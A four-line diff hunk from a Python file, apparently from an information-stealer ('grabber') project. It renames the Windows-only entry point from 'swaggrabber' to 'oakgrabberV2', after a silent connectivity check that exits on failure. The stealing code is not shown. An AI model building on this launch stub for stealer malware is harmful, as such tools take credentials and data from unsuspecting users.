@@ -1559,4 +1559,4 @@ if __name__ == "__main__" and os.name == "nt":
         requests.get('https://1.1.1.1')
     except:
         os._exit(0)
-    asyncio.run(swaggrabber().init())
+    asyncio.run(oakgrabberV2().init())
